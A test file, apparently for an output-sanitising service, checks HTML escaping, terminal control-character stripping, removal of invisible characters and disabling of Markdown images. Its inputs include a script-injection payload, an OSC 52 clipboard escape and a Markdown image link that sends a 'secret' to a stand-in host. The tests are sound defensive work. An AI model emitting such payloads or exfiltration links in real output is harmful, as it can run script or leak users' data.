import { OutputSafetyService } from './output-safety.service.js';

describe('output safety sink preparation', () => {
  it('escapes HTML output recursively', () => {
    expect(
      new OutputSafetyService().prepare(
        { html: '<script>alert("x")</script>' },
        'html',
      ),
    ).toMatchObject({
      sink: 'html',
      content: { html: '&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt;' },
    });
  });

  it('removes unsafe control characters for terminal and log sinks', () => {
    expect(
      new OutputSafetyService().prepare(
        'safe\u001b]52;c;clipboard',
        'terminal',
      ),
    ).toMatchObject({
      sink: 'terminal',
      content: 'safe]52;c;clipboard',
      signals: [{ code: 'control_characters' }],
    });
  });

  it('strips invisible characters before rendering output', () => {
    expect(
      new OutputSafetyService().prepare('a\u200bb\uFE0Fc', 'json'),
    ).toMatchObject({
      sink: 'json',
      content: 'abc',
      signals: [{ code: 'hidden_characters' }],
    });
  });

  it('disables Markdown image rendering channels', () => {
    expect(
      new OutputSafetyService().prepare(
        '![track](https://example.test/pixel?c=secret)',
        'markdown',
      ),
    ).toMatchObject({
      sink: 'markdown',
      content: '[image disabled: track](https://example.test/pixel?c=secret)',
      signals: [
        { code: 'url_exfiltration_channel' },
        { code: 'markdown_image_url_channel' },
      ],
    });
  });
});
